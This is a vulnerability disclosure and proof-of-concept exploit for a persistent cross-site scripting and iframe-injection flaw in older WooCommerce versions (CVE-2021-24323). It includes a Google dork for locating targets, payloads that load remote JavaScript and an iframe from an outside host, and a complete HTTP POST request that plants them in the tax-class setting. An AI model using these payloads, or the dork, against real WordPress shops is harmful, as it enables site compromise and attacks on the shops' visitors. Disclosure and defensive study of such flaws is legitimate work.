/*!
- # VULNERABILITY: WooCommerce WordPress Plugin <= 5.1.0 - Authenticated Persistent XSS & XFS
- # GOOGLE DORK: inurl:/wp-content/plugins/woocommerce/
- # DATE: 2021-03-20
- # SECURITY RESEARCHER: m0ze [ https://m0ze.ru ]
- # VENDOR: Automattic [ https://woocommerce.com ]
- # SOFTWARE VERSION: <= 5.1.0
- # SOFTWARE LINK: https://wordpress.org/plugins/woocommerce/
- # CVSS: AV:N/AC:L/PR:H/UI:N/S:C
- # CWE: CWE-79
- # CVE: CVE-2021-24323
*/



### -- [ Info: ]

[i] An Authenticated Persistent XSS & XFS vulnerabilities was discovered in the WooCommerce plugin through v5.1.0 for WordPress.

[i] Option «Additional tax classes» (/wp-admin/admin.php?page=wc-settings&tab=tax) is vulnerable to XSS & XFS injections.

[i] Required privileges to exploit the vulnerability: shop manager, administrator, custom roles.



### -- [ Impact: ]

[~] Malicious JavaScript code or iFrame injections, the ability to combine attack vectors against the targeted system, which can lead to a complete compromise of the resource.



### -- [ Payloads: ]

[$] <script src="//m0ze.ru/payload/a.js"></script>

[$] <iframe src=https://m0ze.ru/payload/xfsii.html></iframe>



### -- [ PoC | Authenticated Persistent XSS & XFS | Additional tax classes: ]

[!] POST /wp-admin/admin.php?page=wc-settings&tab=tax HTTP/1.1
Host: example.com
Referer: https://example.com/wp-admin/admin.php?page=wc-settings&tab=tax
Content-Type: multipart/form-data; boundary=---------------------------54450411525881450553339755723
Content-Length: 1642
Cookie: [cookies]

-----------------------------54450411525881450553339755723
Content-Disposition: form-data; name="woocommerce_prices_include_tax"

no
-----------------------------54450411525881450553339755723
Content-Disposition: form-data; name="woocommerce_tax_based_on"

shipping
-----------------------------54450411525881450553339755723
Content-Disposition: form-data; name="woocommerce_shipping_tax_class"

inherit
-----------------------------54450411525881450553339755723
Content-Disposition: form-data; name="woocommerce_tax_classes"

Reduced rate
<script src="//m0ze.ru/payload/a.js"></script>
<iframe src=https://m0ze.ru/payload/xfsii.html></iframe>
Zero rate
-----------------------------54450411525881450553339755723
Content-Disposition: form-data; name="woocommerce_tax_display_shop"

excl
-----------------------------54450411525881450553339755723
Content-Disposition: form-data; name="woocommerce_tax_display_cart"

excl
-----------------------------54450411525881450553339755723
Content-Disposition: form-data; name="woocommerce_price_display_suffix"


-----------------------------54450411525881450553339755723
Content-Disposition: form-data; name="woocommerce_tax_total_display"

itemized
-----------------------------54450411525881450553339755723
Content-Disposition: form-data; name="save"

Save changes
-----------------------------54450411525881450553339755723
Content-Disposition: form-data; name="_wpnonce"

88a432b100
-----------------------------54450411525881450553339755723
Content-Disposition: form-data; name="_wp_http_referer"

/wp-admin/admin.php?page=wc-settings&tab=tax
-----------------------------54450411525881450553339755723--



### -- [ Contacts: ]

[+] Website: m0ze.ru
[+] GitHub: @m0ze
[+] Telegram: @m0ze_ru
[+] Twitter: @vladm0ze
